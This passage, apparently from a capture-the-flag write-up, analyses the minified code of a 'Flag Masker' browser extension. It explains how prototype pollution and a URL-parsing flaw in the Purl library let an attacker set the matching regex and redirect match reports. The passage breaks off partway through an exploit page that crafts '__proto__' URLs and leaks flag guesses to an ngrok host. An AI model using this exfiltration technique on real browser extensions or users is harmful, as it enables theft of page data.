            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">~</span>r<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">s</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">)</span><span class="token punctuation">,</span> t<span class="token punctuation">,</span> <span class="token string">"base"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">c</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> o <span class="token keyword">in</span> t<span class="token punctuation">.</span>base<span class="token punctuation">)</span> a<span class="token punctuation">[</span>o<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">.</span>base<span class="token punctuation">[</span>o<span class="token punctuation">]</span><span class="token punctuation">;</span>
                t<span class="token punctuation">.</span>base <span class="token operator">=</span> a
              <span class="token punctuation">&#125;</span>
              <span class="token string">""</span> <span class="token operator">!==</span> r <span class="token operator">&amp;&amp;</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">var</span> a <span class="token operator">=</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">===</span> a <span class="token operator">?</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> e <span class="token operator">:</span> <span class="token function">c</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">?</span> a<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token operator">:</span> t<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> e<span class="token punctuation">]</span>
              <span class="token punctuation">&#125;</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>base<span class="token punctuation">,</span> r<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> t
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">function</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> a <span class="token operator">=</span> t<span class="token punctuation">.</span>length <span class="token operator">>></span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">=</span> arguments<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">&lt;</span> a<span class="token punctuation">;</span><span class="token punctuation">)</span> e <span class="token keyword">in</span> t <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">r</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> t<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">++</span>e<span class="token punctuation">;</span>
              <span class="token keyword">return</span> n
            <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&amp;|;</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                r <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
              <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
              <span class="token keyword">var</span> e <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token function-variable function">a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> r<span class="token punctuation">,</span> e<span class="token punctuation">,</span> a <span class="token operator">=</span> t<span class="token punctuation">.</span>length<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> a<span class="token punctuation">;</span> <span class="token operator">++</span>n<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"]"</span> <span class="token operator">==</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> t<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> <span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"["</span> <span class="token operator">==</span> e <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> <span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"="</span> <span class="token operator">==</span> e <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>r<span class="token punctuation">)</span> <span class="token keyword">return</span> n
                <span class="token punctuation">&#125;</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">,</span>
                n <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a <span class="token operator">||</span> e<span class="token punctuation">)</span><span class="token punctuation">,</span>
                o <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>a <span class="token operator">||</span> e<span class="token punctuation">,</span> r<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">return</span> o <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> o<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">""</span> <span class="token operator">===</span> n <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> r<span class="token punctuation">,</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">u</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> o<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">base</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>base
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">function</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string">"[object Array]"</span> <span class="token operator">===</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span>

          <span class="token keyword">function</span> <span class="token function">d</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">===</span> arguments<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token number">0</span> <span class="token operator">===</span> t <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>r <span class="token operator">=</span> <span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">,</span> t <span class="token operator">=</span> <span class="token keyword">void</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> r <span class="token operator">=</span> r <span class="token operator">||</span> <span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token function">o</span><span class="token punctuation">(</span>t <span class="token operator">=</span> t <span class="token operator">||</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span>
              <span class="token function-variable function">attr</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>t <span class="token operator">=</span> e<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">||</span> t<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>attr<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>attr
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token function-variable function">param</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">!==</span> t <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>param<span class="token punctuation">.</span>query<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>param<span class="token punctuation">.</span>query
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token function-variable function">fparam</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">!==</span> t <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>param<span class="token punctuation">.</span>fragment<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>param<span class="token punctuation">.</span>fragment
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token function-variable function">segment</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">===</span> t <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>path <span class="token operator">:</span> <span class="token punctuation">(</span>t <span class="token operator">=</span> t <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>path<span class="token punctuation">.</span>length <span class="token operator">+</span> t <span class="token operator">:</span> t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>path<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
              <span class="token function-variable function">fsegment</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">===</span> t <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>fragment <span class="token operator">:</span> <span class="token punctuation">(</span>t <span class="token operator">=</span> t <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>fragment<span class="token punctuation">.</span>length <span class="token operator">+</span> t <span class="token operator">:</span> t <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span>seg<span class="token punctuation">.</span>fragment<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> d<span class="token punctuation">.</span><span class="token function-variable function">jQuery</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">null</span> <span class="token operator">!=</span> r <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function-variable function">url</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">var</span> a<span class="token punctuation">,</span> n<span class="token punctuation">,</span> o <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
              <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>o <span class="token operator">=</span> <span class="token function">r</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> a<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> <span class="token operator">?</span> t<span class="token punctuation">[</span>n<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">:</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">d</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>url <span class="token operator">=</span> d<span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> d<span class="token punctuation">.</span><span class="token function">jQuery</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>jQuery<span class="token punctuation">)</span><span class="token punctuation">,</span> d
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">a</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> e<span class="token punctuation">,</span> r<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">:</span> a<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>exports <span class="token operator">=</span> n<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token number">144</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t<span class="token punctuation">,</span> r<span class="token punctuation">,</span> e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"use strict"</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>__importDefault <span class="token operator">||</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> t <span class="token operator">&amp;&amp;</span> t<span class="token punctuation">.</span>__esModule <span class="token operator">?</span> t <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">default</span><span class="token operator">:</span> t
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token string">"__esModule"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
          <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token number">0</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> n<span class="token punctuation">,</span> o<span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token number">576</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Flag Masker - content script is loaded."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">.</span>default<span class="token punctuation">)</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>href<span class="token punctuation">)</span><span class="token punctuation">,</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> localStorage<span class="token punctuation">.</span>config <span class="token operator">?</span> o <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span>config<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/config"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> t<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> o <span class="token operator">=</span> t
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> chrome<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
          <span class="token literal-property property">regex</span><span class="token operator">:</span> o<span class="token punctuation">.</span>regex<span class="token punctuation">,</span>
          <span class="token literal-property property">head</span><span class="token operator">:</span> window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>head<span class="token punctuation">.</span>innerHTML<span class="token punctuation">,</span>
          <span class="token literal-property property">body</span><span class="token operator">:</span> window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          t<span class="token punctuation">.</span>flag <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>head<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> t<span class="token punctuation">.</span>head<span class="token punctuation">,</span> window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> t<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token function">fetch</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>data<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>path <span class="token operator">+</span> <span class="token string">"/alert"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">referrerPolicy</span><span class="token operator">:</span> <span class="token string">"unsafe-url"</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    r <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token operator">!</span> <span class="token keyword">function</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> n <span class="token operator">=</span> r<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token number">0</span> <span class="token operator">!==</span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> n<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>
    <span class="token keyword">var</span> o <span class="token operator">=</span> r<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> t<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>exports<span class="token punctuation">,</span> o<span class="token punctuation">,</span> o<span class="token punctuation">.</span>exports<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">,</span> o<span class="token punctuation">.</span>exports
  <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token number">144</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This code is a bit longer, but it basically reads the config first, then sends the content of the body and head to the worker to replace. After replacing, it puts the content back on the screen and reports the matching content to the location <code>n.data.attr.path + /alert</code>.</p>
<p>If you search for the long code above, you’ll find that it comes from the <a target="_blank" rel="noopener" href="https://github.com/allmarkedup/purl">Purl</a> library, which has been abandoned for a long time. Apart from having a prototype pollution problem, it also has many vulnerabilities in parsing URLs.</p>
<p>First, let’s talk about prototype pollution. We can control the <code>localStorage.config</code> property by polluting the config, and pass in the regular expression we want. I initially thought of creating a ReDos or something similar and then detecting the time, but later I found out that <code>n.data.attr.path</code> can also be controlled.</p>
<p>For example, the path of the URL <code>http://web:8000/#@acabc//8cae-ip.ngrok.io</code> will be parsed as <code>//8cae-ip.ngrok.io</code>, so we can send the request to our server.</p>
<p>Combined with the config mentioned earlier, we can know which regular expression has a match.</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> domain <span class="token operator">=</span> <span class="token string">'8cae.ngrok.io'</span>
  <span class="token keyword">const</span> base <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> domain
  <span class="token keyword">function</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://web:8000/#@acabc//</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>domain<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>flag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">?q[__proto__][config]=&#123;"regex":"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>flag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"&#125;</span><span class="token template-punctuation string">`</span></span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token string">'?msg='</span> <span class="token operator">+</span> msg<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
